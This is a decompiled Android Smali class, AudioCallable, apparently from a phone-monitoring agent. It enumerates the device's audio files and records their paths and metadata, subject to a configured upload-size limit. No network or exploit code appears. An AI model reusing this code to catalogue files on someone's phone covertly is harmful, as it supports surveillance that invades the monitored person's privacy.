.class public Lcom/hp/vd/module/monitor/audio/AudioCallable;
.super Ljava/lang/Object;
.source "AudioCallable.java"

# interfaces
.implements Ljava/util/concurrent/Callable;


# annotations
.annotation system Ldalvik/annotation/Signature;
    value = {
        "Ljava/lang/Object;",
        "Ljava/util/concurrent/Callable<",
        "Ljava/lang/Void;",
        ">;"
    }
.end annotation


# static fields
.field protected static final TAG:Ljava/lang/String; = "AudioCallable"


# instance fields
.field protected audioObserver:Lcom/hp/vd/module/monitor/audio/AudioObserver;

.field protected contentResolver:Landroid/content/ContentResolver;

.field protected contentUri:Landroid/net/Uri;

.field protected dao:Lcom/j256/ormlite/dao/Dao;
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "Lcom/j256/ormlite/dao/Dao<",
            "Lcom/hp/vd/data/AudioData;",
            "Ljava/lang/Integer;",
            ">;"
        }
    .end annotation
.end field

.field protected log:Lcom/hp/vd/agent/log/IWriter;

.field protected moduleDao:Lcom/j256/ormlite/dao/Dao;
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "Lcom/j256/ormlite/dao/Dao<",
            "Lcom/hp/vd/data/ModuleData;",
            "Ljava/lang/Integer;",
            ">;"
        }
    .end annotation
.end field

.field protected moduleData:Lcom/hp/vd/data/ModuleData;


# direct methods
.method public constructor <init>(Landroid/content/ContentResolver;Landroid/net/Uri;Lcom/j256/ormlite/dao/Dao;Lcom/hp/vd/data/ModuleData;Lcom/hp/vd/module/monitor/audio/AudioObserver;Lcom/j256/ormlite/dao/Dao;Lcom/hp/vd/agent/log/IWriter;)V
    .locals 1
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "(",
            "Landroid/content/ContentResolver;",
            "Landroid/net/Uri;",
            "Lcom/j256/ormlite/dao/Dao<",
            "Lcom/hp/vd/data/AudioData;",
            "Ljava/lang/Integer;",
            ">;",
            "Lcom/hp/vd/data/ModuleData;",
            "Lcom/hp/vd/module/monitor/audio/AudioObserver;",
            "Lcom/j256/ormlite/dao/Dao<",
            "Lcom/hp/vd/data/ModuleData;",
            "Ljava/lang/Integer;",
            ">;",
            "Lcom/hp/vd/agent/log/IWriter;",
            ")V"
        }
    .end annotation

    .line 45
    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    const/4 v0, 0x0

    .line 29
    iput-object v0, p0, Lcom/hp/vd/module/monitor/audio/AudioCallable;->contentResolver:Landroid/content/ContentResolver;

    .line 30
    iput-object v0, p0, Lcom/hp/vd/module/monitor/audio/AudioCallable;->contentUri:Landroid/net/Uri;

    .line 31
    iput-object v0, p0, Lcom/hp/vd/module/monitor/audio/AudioCallable;->dao:Lcom/j256/ormlite/dao/Dao;

    .line 32
    iput-object v0, p0, Lcom/hp/vd/module/monitor/audio/AudioCallable;->moduleData:Lcom/hp/vd/data/ModuleData;

    .line 33
    iput-object v0, p0, Lcom/hp/vd/module/monitor/audio/AudioCallable;->audioObserver:Lcom/hp/vd/module/monitor/audio/AudioObserver;

    .line 34
    iput-object v0, p0, Lcom/hp/vd/module/monitor/audio/AudioCallable;->moduleDao:Lcom/j256/ormlite/dao/Dao;

    .line 35
    iput-object v0, p0, Lcom/hp/vd/module/monitor/audio/AudioCallable;->log:Lcom/hp/vd/agent/log/IWriter;

    .line 46
    iput-object p1, p0, Lcom/hp/vd/module/monitor/audio/AudioCallable;->contentResolver:Landroid/content/ContentResolver;

    .line 47
    iput-object p2, p0, Lcom/hp/vd/module/monitor/audio/AudioCallable;->contentUri:Landroid/net/Uri;

    .line 48
    iput-object p3, p0, Lcom/hp/vd/module/monitor/audio/AudioCallable;->dao:Lcom/j256/ormlite/dao/Dao;

    .line 49
    iput-object p4, p0, Lcom/hp/vd/module/monitor/audio/AudioCallable;->moduleData:Lcom/hp/vd/data/ModuleData;

    .line 50
    iput-object p5, p0, Lcom/hp/vd/module/monitor/audio/AudioCallable;->audioObserver:Lcom/hp/vd/module/monitor/audio/AudioObserver;

    .line 51
    iput-object p6, p0, Lcom/hp/vd/module/monitor/audio/AudioCallable;->moduleDao:Lcom/j256/ormlite/dao/Dao;

    .line 52
    iput-object p7, p0, Lcom/hp/vd/module/monitor/audio/AudioCallable;->log:Lcom/hp/vd/agent/log/IWriter;

    return-void
.end method


# virtual methods
.method public bridge synthetic call()Ljava/lang/Object;
    .locals 1
    .annotation system Ldalvik/annotation/Throws;
        value = {
            Ljava/lang/Exception;
        }
    .end annotation

    .line 25
    invoke-virtual {p0}, Lcom/hp/vd/module/monitor/audio/AudioCallable;->call()Ljava/lang/Void;

    move-result-object v0

    return-object v0
.end method

.method public call()Ljava/lang/Void;
    .locals 13
    .annotation system Ldalvik/annotation/Throws;
        value = {
            Ljava/sql/SQLException;
        }
    .end annotation

    const/4 v0, 0x0

    .line 65
    :try_start_0
    iget-object v1, p0, Lcom/hp/vd/module/monitor/audio/AudioCallable;->contentResolver:Landroid/content/ContentResolver;

    iget-object v2, p0, Lcom/hp/vd/module/monitor/audio/AudioCallable;->contentUri:Landroid/net/Uri;

    const/4 v3, 0x0

    new-instance v4, Ljava/lang/StringBuilder;

    invoke-direct {v4}, Ljava/lang/StringBuilder;-><init>()V

    const-string v5, "_id > "

    invoke-virtual {v4, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    iget-object v5, p0, Lcom/hp/vd/module/monitor/audio/AudioCallable;->moduleData:Lcom/hp/vd/data/ModuleData;

    const-string v6, "max_internal_audio_id"

    .line 68
    invoke-virtual {v5, v6}, Lcom/hp/vd/data/ModuleData;->customGet(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v4, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v4}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v4

    const/4 v5, 0x0

    const-string v6, "_id"

    .line 65
    invoke-virtual/range {v1 .. v6}, Landroid/content/ContentResolver;->query(Landroid/net/Uri;[Ljava/lang/String;Ljava/lang/String;[Ljava/lang/String;Ljava/lang/String;)Landroid/database/Cursor;

    move-result-object v1
    :try_end_0
    .catch Landroid/database/sqlite/SQLiteException; {:try_start_0 .. :try_end_0} :catch_0

    if-nez v1, :cond_0

    .line 80
    iget-object v1, p0, Lcom/hp/vd/module/monitor/audio/AudioCallable;->log:Lcom/hp/vd/agent/log/IWriter;

    const-string v2, "AudioCallable"

    new-instance v3, Ljava/lang/StringBuilder;

    invoke-direct {v3}, Ljava/lang/StringBuilder;-><init>()V

    const-string v4, "Could not open a cursor for: "

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    iget-object v4, p0, Lcom/hp/vd/module/monitor/audio/AudioCallable;->contentUri:Landroid/net/Uri;

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/Object;)Ljava/lang/StringBuilder;

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v3

    const/4 v4, 0x3

    invoke-interface {v1, v2, v3, v4}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;I)Z

    return-object v0

    .line 89
    :cond_0
    invoke-interface {v1}, Landroid/database/Cursor;->getCount()I

    move-result v2

    .line 91
    iget-object v3, p0, Lcom/hp/vd/module/monitor/audio/AudioCallable;->log:Lcom/hp/vd/agent/log/IWriter;

    const-string v4, "AudioCallable"

    new-instance v5, Ljava/lang/StringBuilder;

    invoke-direct {v5}, Ljava/lang/StringBuilder;-><init>()V

    const-string v6, "call(): total entries: "

    invoke-virtual {v5, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v5, v2}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    const-string v6, " with _id > "

    invoke-virtual {v5, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    iget-object v6, p0, Lcom/hp/vd/module/monitor/audio/AudioCallable;->moduleData:Lcom/hp/vd/data/ModuleData;

    const-string v7, "max_internal_audio_id"

    .line 93
    invoke-virtual {v6, v7}, Lcom/hp/vd/data/ModuleData;->customGet(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v6

    invoke-virtual {v5, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v5}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v5

    .line 91
    invoke-interface {v3, v4, v5}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;)Z

    if-nez v2, :cond_1

    .line 97
    iget-object v1, p0, Lcom/hp/vd/module/monitor/audio/AudioCallable;->log:Lcom/hp/vd/agent/log/IWriter;

    const-string v2, "AudioCallable"

    const-string v3, "No entries. Exiting..."

    invoke-interface {v1, v2, v3}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;)Z

    return-object v0

    :cond_1
    const/4 v2, 0x0

    const/4 v3, -0x1

    move v4, v2

    move v5, v3

    .line 105
    :goto_0
    invoke-interface {v1}, Landroid/database/Cursor;->moveToNext()Z

    move-result v6

    if-eqz v6, :cond_8

    const-string v6, "_data"

    .line 106
    invoke-interface {v1, v6}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v6

    invoke-interface {v1, v6}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v6

    .line 107
    new-instance v7, Ljava/io/File;

    invoke-direct {v7, v6}, Ljava/io/File;-><init>(Ljava/lang/String;)V

    .line 109
    invoke-virtual {v7}, Ljava/io/File;->length()J

    move-result-wide v8

    iget-object v10, p0, Lcom/hp/vd/module/monitor/audio/AudioCallable;->moduleData:Lcom/hp/vd/data/ModuleData;

    const-string v11, "max_file_upload_size"

    invoke-virtual {v10, v11}, Lcom/hp/vd/data/ModuleData;->customGetLong(Ljava/lang/String;)Ljava/lang/Long;

    move-result-object v10

    invoke-virtual {v10}, Ljava/lang/Long;->longValue()J

    move-result-wide v10

    cmp-long v12, v8, v10

    if-lez v12, :cond_2

    .line 110
    iget-object v8, p0, Lcom/hp/vd/module/monitor/audio/AudioCallable;->log:Lcom/hp/vd/agent/log/IWriter;

    const-string v9, "AudioCallable"

    new-instance v10, Ljava/lang/StringBuilder;

    invoke-direct {v10}, Ljava/lang/StringBuilder;-><init>()V

    const-string v11, "The file at: "

    invoke-virtual {v10, v11}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v10, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v6, " ("

    invoke-virtual {v10, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    .line 112
    invoke-virtual {v7}, Ljava/io/File;->length()J

    move-result-wide v6

    const-wide/16 v11, 0x400

    div-long/2addr v6, v11

    div-long/2addr v6, v11

    invoke-virtual {v10, v6, v7}, Ljava/lang/StringBuilder;->append(J)Ljava/lang/StringBuilder;

    const-string v6, "MB.) is bigger than "

    invoke-virtual {v10, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v6, "max_file_upload_size"

    invoke-virtual {v10, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v6, ". Skipping this record."

    invoke-virtual {v10, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v10}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v6

    .line 110
    invoke-interface {v8, v9, v6}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;)Z

    goto :goto_0

    :cond_2
    add-int/lit8 v4, v4, 0x1

    .line 125
    new-instance v5, Lcom/hp/vd/data/AudioData;

    invoke-direct {v5}, Lcom/hp/vd/data/AudioData;-><init>()V

    const-string v7, "_id"

    .line 127
    invoke-interface {v1, v7}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v7

    invoke-interface {v1, v7}, Landroid/database/Cursor;->getInt(I)I

    move-result v7

    invoke-static {v7}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v7

    iput-object v7, v5, Lcom/hp/vd/data/AudioData;->internalId:Ljava/lang/Integer;

    .line 128
    iput-object v6, v5, Lcom/hp/vd/data/AudioData;->url:Ljava/lang/String;

    const-string v6, "_display_name"

    .line 130
    invoke-interface {v1, v6}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v6

    invoke-interface {v1, v6}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v6

    iput-object v6, v5, Lcom/hp/vd/data/AudioData;->name:Ljava/lang/String;

    const-string v6, "date_added"

    .line 131
    invoke-interface {v1, v6}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v6

    invoke-interface {v1, v6}, Landroid/database/Cursor;->getLong(I)J

    move-result-wide v6

    invoke-static {v6, v7}, Ljava/lang/Long;->valueOf(J)Ljava/lang/Long;

    move-result-object v6

    .line 133
    new-instance v7, Ljava/util/Date;

    invoke-virtual {v6}, Ljava/lang/Long;->longValue()J

    move-result-wide v8

    invoke-direct {v7, v8, v9}, Ljava/util/Date;-><init>(J)V

    iput-object v7, v5, Lcom/hp/vd/data/AudioData;->createdAt:Ljava/util/Date;

    const-string v6, "artist"

    .line 140
    invoke-interface {v1, v6}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v6

    invoke-interface {v1, v6}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v6

    iput-object v6, v5, Lcom/hp/vd/data/AudioData;->artist:Ljava/lang/String;

    const-string v6, "title"

    .line 141
    invoke-interface {v1, v6}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v6

    invoke-interface {v1, v6}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v6

    iput-object v6, v5, Lcom/hp/vd/data/AudioData;->title:Ljava/lang/String;

    const-string v6, "album"

    .line 142
    invoke-interface {v1, v6}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v6

    invoke-interface {v1, v6}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v6

    iput-object v6, v5, Lcom/hp/vd/data/AudioData;->album:Ljava/lang/String;

    const-string v6, "composer"

    .line 143
    invoke-interface {v1, v6}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v6

    invoke-interface {v1, v6}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v6

    iput-object v6, v5, Lcom/hp/vd/data/AudioData;->composer:Ljava/lang/String;

    const-string v6, "duration"

    .line 144
    invoke-interface {v1, v6}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v6

    invoke-interface {v1, v6}, Landroid/database/Cursor;->getInt(I)I

    move-result v6

    invoke-static {v6}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v6

    iput-object v6, v5, Lcom/hp/vd/data/AudioData;->duration:Ljava/lang/Integer;

    const-string v6, "track"

    .line 145
    invoke-interface {v1, v6}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v6

    invoke-interface {v1, v6}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v6

    iput-object v6, v5, Lcom/hp/vd/data/AudioData;->track:Ljava/lang/String;

    .line 146
    new-instance v6, Ljava/util/Date;

    const-string v7, "year"

    invoke-interface {v1, v7}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v7

    invoke-interface {v1, v7}, Landroid/database/Cursor;->getLong(I)J

    move-result-wide v7

    invoke-direct {v6, v7, v8}, Ljava/util/Date;-><init>(J)V

    iput-object v6, v5, Lcom/hp/vd/data/AudioData;->year:Ljava/util/Date;

    const-string v6, "is_alarm"

    .line 152
    invoke-interface {v1, v6}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v6

    invoke-interface {v1, v6}, Landroid/database/Cursor;->getInt(I)I

    move-result v6

    invoke-static {v6}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v6

    const-string v7, "is_music"

    .line 153
    invoke-interface {v1, v7}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v7

    invoke-interface {v1, v7}, Landroid/database/Cursor;->getInt(I)I

    move-result v7

    invoke-static {v7}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v7

    const-string v8, "is_notification"

    .line 154
    invoke-interface {v1, v8}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v8

    invoke-interface {v1, v8}, Landroid/database/Cursor;->getInt(I)I

    move-result v8

    invoke-static {v8}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v8

    const-string v9, "is_podcast"

    .line 155
    invoke-interface {v1, v9}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v9

    invoke-interface {v1, v9}, Landroid/database/Cursor;->getInt(I)I

    move-result v9

    invoke-static {v9}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v9

    const-string v10, "is_ringtone"

    .line 156
    invoke-interface {v1, v10}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v10

    invoke-interface {v1, v10}, Landroid/database/Cursor;->getInt(I)I

    move-result v10

    invoke-static {v10}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v10

    .line 158
    invoke-static {v2}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v11

    if-eqz v6, :cond_3

    .line 160
    invoke-virtual {v6}, Ljava/lang/Integer;->intValue()I

    move-result v6

    if-eqz v6, :cond_3

    .line 161
    invoke-virtual {v11}, Ljava/lang/Integer;->intValue()I

    move-result v6

    add-int/lit8 v6, v6, 0x1

    invoke-static {v6}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v11

    :cond_3
    if-eqz v7, :cond_4

    .line 164
    invoke-virtual {v7}, Ljava/lang/Integer;->intValue()I

    move-result v6

    if-eqz v6, :cond_4

    .line 165
    invoke-virtual {v11}, Ljava/lang/Integer;->intValue()I

    move-result v6

    add-int/lit8 v6, v6, 0x2

    invoke-static {v6}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v11

    :cond_4
    if-eqz v8, :cond_5

    .line 168
    invoke-virtual {v8}, Ljava/lang/Integer;->intValue()I

    move-result v6

    if-eqz v6, :cond_5

    .line 169
    invoke-virtual {v11}, Ljava/lang/Integer;->intValue()I

    move-result v6

    add-int/lit8 v6, v6, 0x4

    invoke-static {v6}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v11

    :cond_5
    if-eqz v9, :cond_6

    .line 172
    invoke-virtual {v9}, Ljava/lang/Integer;->intValue()I

    move-result v6

    if-eqz v6, :cond_6

    .line 173
    invoke-virtual {v11}, Ljava/lang/Integer;->intValue()I

    move-result v6

    add-int/lit8 v6, v6, 0x8

    invoke-static {v6}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v11

    :cond_6
    if-eqz v10, :cond_7

    .line 176
    invoke-virtual {v10}, Ljava/lang/Integer;->intValue()I

    move-result v6

    if-eqz v6, :cond_7

    .line 177
    invoke-virtual {v11}, Ljava/lang/Integer;->intValue()I

    move-result v6

    add-int/lit8 v6, v6, 0x10

    invoke-static {v6}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v11

    .line 180
    :cond_7
    iput-object v11, v5, Lcom/hp/vd/data/AudioData;->mediaType:Ljava/lang/Integer;

    .line 182
    iget-object v6, p0, Lcom/hp/vd/module/monitor/audio/AudioCallable;->dao:Lcom/j256/ormlite/dao/Dao;

    invoke-interface {v6, v5}, Lcom/j256/ormlite/dao/Dao;->create(Ljava/lang/Object;)I

    .line 184
    iget-object v5, v5, Lcom/hp/vd/data/AudioData;->internalId:Ljava/lang/Integer;

    invoke-virtual {v5}, Ljava/lang/Integer;->intValue()I

    move-result v5

    goto/16 :goto_0

    .line 187
    :cond_8
    iget-object v2, p0, Lcom/hp/vd/module/monitor/audio/AudioCallable;->log:Lcom/hp/vd/agent/log/IWriter;

    const-string v6, "AudioCallable"

    new-instance v7, Ljava/lang/StringBuilder;

    invoke-direct {v7}, Ljava/lang/StringBuilder;-><init>()V

    const-string v8, "run(): audio listed = "

    invoke-virtual {v7, v8}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v7, v4}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    invoke-virtual {v7}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v4

    invoke-interface {v2, v6, v4}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;)Z

    .line 189
    invoke-interface {v1}, Landroid/database/Cursor;->isClosed()Z

    move-result v2

    if-nez v2, :cond_9

    .line 190
    invoke-interface {v1}, Landroid/database/Cursor;->close()V

    :cond_9
    if-eq v5, v3, :cond_a

    .line 194
    iget-object v1, p0, Lcom/hp/vd/module/monitor/audio/AudioCallable;->moduleData:Lcom/hp/vd/data/ModuleData;

    const-string v2, "max_internal_audio_id"

    invoke-static {v5}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v3

    invoke-virtual {v1, v2, v3}, Lcom/hp/vd/data/ModuleData;->customSet(Ljava/lang/String;Ljava/lang/Integer;)V

    .line 195
    iget-object v1, p0, Lcom/hp/vd/module/monitor/audio/AudioCallable;->moduleDao:Lcom/j256/ormlite/dao/Dao;

    iget-object v2, p0, Lcom/hp/vd/module/monitor/audio/AudioCallable;->moduleData:Lcom/hp/vd/data/ModuleData;

    invoke-interface {v1, v2}, Lcom/j256/ormlite/dao/Dao;->update(Ljava/lang/Object;)I

    :cond_a
    return-object v0

    :catch_0
    move-exception v1

    .line 74
    iget-object v2, p0, Lcom/hp/vd/module/monitor/audio/AudioCallable;->log:Lcom/hp/vd/agent/log/IWriter;

    const-string v3, "AudioCallable"

    const-string v4, "SQLiteException caught while quering contentResolver"

    invoke-interface {v2, v3, v4, v1}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)Z

    return-object v0
.end method
